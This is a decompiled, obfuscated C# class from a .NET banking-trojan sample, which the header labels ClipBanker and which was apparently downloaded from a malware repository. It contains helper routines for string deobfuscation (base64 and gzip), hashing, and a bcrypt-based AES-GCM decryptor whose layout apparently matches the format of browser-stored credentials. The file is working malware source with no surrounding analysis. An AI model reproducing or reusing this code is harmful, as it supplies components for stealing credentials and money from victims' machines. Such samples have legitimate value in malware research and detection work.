// Decompiled with JetBrains decompiler
// Type: 5J5.aw8
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u0035J5;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace \u0035J5
{
  internal static class aw8
  {
    public static string \u0038HV([In] string obj0)
    {
      using (MD5 md5 = MD5.Create())
      {
        byte[] bytes = Encoding.ASCII.GetBytes(obj0);
        byte[] hash = md5.ComputeHash(bytes);
        StringBuilder stringBuilder = new StringBuilder();
        for (int index = 0; index < hash.Length; ++index)
          stringBuilder.Append(hash[index].ToString("x2"));
        return stringBuilder.ToString();
      }
    }

    public static string \u00311f([In] string obj0)
    {
      using (SHA1Managed shA1Managed = new SHA1Managed())
        return string.Join("", ((IEnumerable<byte>) shA1Managed.ComputeHash(Encoding.UTF8.GetBytes(obj0))).Select<byte, string>(aw8.l4A.\u003C\u003E9__1_0 ?? (aw8.l4A.\u003C\u003E9__1_0 = new Func<byte, string>(aw8.l4A.\u003C\u003E9.\u0031TQ))).ToArray<string>());
    }

    public static string \u0032FK([In] string obj0)
    {
      using (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(obj0)))
      {
        using (MemoryStream destination = new MemoryStream())
        {
          using (GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress))
            gzipStream.CopyTo((Stream) destination);
          return Encoding.UTF8.GetString(destination.ToArray());
        }
      }
    }

    public static string \u0032u1([In] string obj0, [In] Dictionary<string, string> obj1)
    {
      for (int index = 0; index < obj0.Length / obj0.Length; ++index)
        obj0 = obj0.Trim();
      foreach (KeyValuePair<string, string> keyValuePair in obj1)
        obj0 = obj0.Replace(keyValuePair.Value, keyValuePair.Key);
      return obj0;
    }

    public static string tt4(string _param0, bool _param1 = false) => _param1 ? Convert.ToBase64String(Encoding.UTF8.GetBytes(_param0)) : Convert.ToBase64String(Encoding.UTF8.GetBytes(_param0)).Replace("=", nameof ());

    public static string P38([In] string obj0) => Encoding.UTF8.GetString(Convert.FromBase64String(obj0));

    public static string \u0032T2([In] string obj0)
    {
      try
      {
        for (int index = 0; index < obj0.Length / obj0.Length; ++index)
          obj0 = obj0.Trim();
        return aw8.\u0032FK(obj0);
      }
      catch
      {
      }
      return string.Empty;
    }

    public sealed class \u00375t
    {
      [DllImport("bcrypt.dll", EntryPoint = "BCryptOpenAlgorithmProvider")]
      private static extern uint f41(
        out IntPtr _param0,
        [MarshalAs(UnmanagedType.LPWStr)] string _param1,
        [MarshalAs(UnmanagedType.LPWStr)] string _param2,
        uint _param3);

      [DllImport("bcrypt.dll", EntryPoint = "BCryptCloseAlgorithmProvider")]
      private static extern uint \u0035Q7([In] IntPtr obj0, [In] uint obj1);

      [DllImport("bcrypt.dll", EntryPoint = "BCryptGetProperty")]
      private static extern uint vO3(
        IntPtr _param0,
        [MarshalAs(UnmanagedType.LPWStr)] string _param1,
        byte[] _param2,
        int _param3,
        ref int _param4,
        uint _param5);

      [DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
      private static extern uint U2J(
        IntPtr _param0,
        [MarshalAs(UnmanagedType.LPWStr)] string _param1,
        byte[] _param2,
        int _param3,
        int _param4);

      [DllImport("bcrypt.dll", EntryPoint = "BCryptImportKey")]
      private static extern uint nE8(
        IntPtr _param0,
        IntPtr _param1,
        [MarshalAs(UnmanagedType.LPWStr)] string _param2,
        out IntPtr _param3,
        IntPtr _param4,
        int _param5,
        byte[] _param6,
        int _param7,
        uint _param8);

      [DllImport("bcrypt.dll", EntryPoint = "BCryptDestroyKey")]
      private static extern uint \u003763([In] IntPtr obj0);

      [DllImport("bcrypt.dll", EntryPoint = "BCryptDecrypt")]
      private static extern uint \u0038V3(
        [In] IntPtr obj0,
        [In] byte[] obj1,
        [In] int obj2,
        [In] ref aw8.\u00375t.\u0033bL obj3,
        [In] byte[] obj4,
        [In] int obj5,
        [In] byte[] obj6,
        [In] int obj7,
        [In] ref int obj8,
        [In] int obj9);

      public static string \u0032rG([In] byte[] obj0, [In] byte[] obj1) => Encoding.GetEncoding("windows-1251").GetString(aw8.\u00375t.EEW(obj1, obj0));

      private static byte[] EEW([In] byte[] obj0, [In] byte[] obj1)
      {
        byte[] destinationArray1 = new byte[12]
        {
          (byte) 1,
          (byte) 2,
          (byte) 3,
          (byte) 4,
          (byte) 5,
          (byte) 6,
          (byte) 7,
          (byte) 8,
          (byte) 0,
          (byte) 0,
          (byte) 0,
          (byte) 0
        };
        Array.Copy((Array) obj0, 3, (Array) destinationArray1, 0, 12);
        try
        {
          byte[] numArray = new byte[obj0.Length - 15];
          Array.Copy((Array) obj0, 15, (Array) numArray, 0, obj0.Length - 15);
          byte[] destinationArray2 = new byte[16];
          byte[] destinationArray3 = new byte[numArray.Length - destinationArray2.Length];
          Array.Copy((Array) numArray, numArray.Length - 16, (Array) destinationArray2, 0, 16);
          Array.Copy((Array) numArray, 0, (Array) destinationArray3, 0, numArray.Length - destinationArray2.Length);
          return new aw8.\u00375t().Al1(obj1, destinationArray1, (byte[]) null, destinationArray3, destinationArray2);
        }
        catch
        {
        }
        return (byte[]) null;
      }

      private byte[] Al1([In] byte[] obj0, [In] byte[] obj1, [In] byte[] obj2, [In] byte[] obj3, [In] byte[] obj4)
      {
        IntPtr num1 = this.jZ2("AES", "Microsoft Primitive Provider", "ChainingModeGCM");
        IntPtr num2;
        IntPtr hglobal = this.ZIO(num1, obj0, out num2);
        aw8.\u00375t.\u0033bL obj = new aw8.\u00375t.\u0033bL(obj1, obj2, obj4);
        byte[] numArray1;
        using (obj)
        {
          byte[] numArray2 = new byte[this.\u0037E4(num1)];
          int length = 0;
          if (aw8.\u00375t.\u0038V3(num2, obj3, obj3.Length, ref obj, numArray2, numArray2.Length, (byte[]) null, 0, ref length, 0) > 0U)
            throw new CryptographicException();
          numArray1 = new byte[length];
          uint num3 = aw8.\u00375t.\u0038V3(num2, obj3, obj3.Length, ref obj, numArray2, numArray2.Length, numArray1, numArray1.Length, ref length, 0);
          if (num3 == 3221266434U)
            throw new CryptographicException();
          if (num3 > 0U)
            throw new CryptographicException();
        }
        int num4 = (int) aw8.\u00375t.\u003763(num2);
        Marshal.FreeHGlobal(hglobal);
        int num5 = (int) aw8.\u00375t.\u0035Q7(num1, 0U);
        return numArray1;
      }

      private int \u0037E4([In] IntPtr obj0)
      {
        byte[] numArray = this.\u0032J9(obj0, "AuthTagLength");
        return BitConverter.ToInt32(new byte[4]
        {
          numArray[4],
          numArray[5],
          numArray[6],
          numArray[7]
        }, 0);
      }

      private IntPtr jZ2([In] string obj0, [In] string obj1, [In] string obj2)
      {
        IntPtr zero = IntPtr.Zero;
        if (aw8.\u00375t.f41(out zero, obj0, obj1, 0U) > 0U)
          throw new CryptographicException();
        byte[] bytes = Encoding.Unicode.GetBytes(obj2);
        if (aw8.\u00375t.U2J(zero, "ChainingMode", bytes, bytes.Length, 0) > 0U)
          throw new CryptographicException();
        return zero;
      }

      private IntPtr ZIO(IntPtr _param1, byte[] _param2, out IntPtr _param3)
      {
        int int32 = BitConverter.ToInt32(this.\u0032J9(_param1, "ObjectLength"), 0);
        IntPtr num = Marshal.AllocHGlobal(int32);
        byte[] numArray = this.D64(new byte[4][]
        {
          BitConverter.GetBytes(1296188491),
          BitConverter.GetBytes(1),
          BitConverter.GetBytes(_param2.Length),
          _param2
        });
        if (aw8.\u00375t.nE8(_param1, IntPtr.Zero, "KeyDataBlob", out _param3, num, int32, numArray, numArray.Length, 0U) > 0U)
          throw new CryptographicException();
        return num;
      }

      private byte[] \u0032J9([In] IntPtr obj0, [In] string obj1)
      {
        int length = 0;
        if (aw8.\u00375t.vO3(obj0, obj1, (byte[]) null, 0, ref length, 0U) > 0U)
          throw new CryptographicException();
        byte[] numArray = new byte[length];
        if (aw8.\u00375t.vO3(obj0, obj1, numArray, numArray.Length, ref length, 0U) > 0U)
          throw new CryptographicException();
        return numArray;
      }

      private byte[] D64([In] byte[][] obj0)
      {
        int num = 0;
        foreach (byte[] numArray in obj0)
        {
          if (numArray != null)
            num += numArray.Length;
        }
        byte[] dst = new byte[num - 1 + 1];
        int dstOffset = 0;
        foreach (byte[] src in obj0)
        {
          if (src != null)
          {
            Buffer.BlockCopy((Array) src, 0, (Array) dst, dstOffset, src.Length);
            dstOffset += src.Length;
          }
        }
        return dst;
      }

      private struct \u0033bL : IDisposable
      {
        public static readonly int \u0036M6 = 1;
        public int Lt5;
        public int \u0033t7;
        public IntPtr \u00355C;
        public int \u003321;
        public IntPtr V58;
        public int \u0038fv;
        public IntPtr \u0036Xd;
        public int AKI;
        public IntPtr \u0037C8;
        public int \u0039q7;
        public int f7n;
        public long \u003595;
        public int vlp;

        public \u0033bL([In] byte[] obj0, [In] byte[] obj1, [In] byte[] obj2)
          : this()
        {
          this.\u0033t7 = aw8.\u00375t.\u0033bL.\u0036M6;
          this.Lt5 = Marshal.SizeOf(typeof (aw8.\u00375t.\u0033bL));
          if (obj0 != null)
          {
            this.\u003321 = obj0.Length;
            this.\u00355C = Marshal.AllocHGlobal(this.\u003321);
            Marshal.Copy(obj0, 0, this.\u00355C, this.\u003321);
          }
          if (obj1 != null)
          {
            this.\u0038fv = obj1.Length;
            this.V58 = Marshal.AllocHGlobal(this.\u0038fv);
            Marshal.Copy(obj1, 0, this.V58, this.\u0038fv);
          }
          if (obj2 == null)
            return;
          this.AKI = obj2.Length;
          this.\u0036Xd = Marshal.AllocHGlobal(this.AKI);
          Marshal.Copy(obj2, 0, this.\u0036Xd, this.AKI);
          this.\u0039q7 = obj2.Length;
          this.\u0037C8 = Marshal.AllocHGlobal(this.\u0039q7);
        }

        public void \u0023Nn()
        {
          if (this.\u00355C != IntPtr.Zero)
            Marshal.FreeHGlobal(this.\u00355C);
          if (this.\u0036Xd != IntPtr.Zero)
            Marshal.FreeHGlobal(this.\u0036Xd);
          if (this.V58 != IntPtr.Zero)
            Marshal.FreeHGlobal(this.V58);
          if (!(this.\u0037C8 != IntPtr.Zero))
            return;
          Marshal.FreeHGlobal(this.\u0037C8);
        }
      }
    }

    [Serializable]
    private sealed class l4A
    {
      public static readonly aw8.l4A \u003C\u003E9 = new aw8.l4A();
      public static Func<byte, string> \u003C\u003E9__1_0;

      internal string \u0031TQ([In] byte obj0) => obj0.ToString("x2");
    }
  }
}
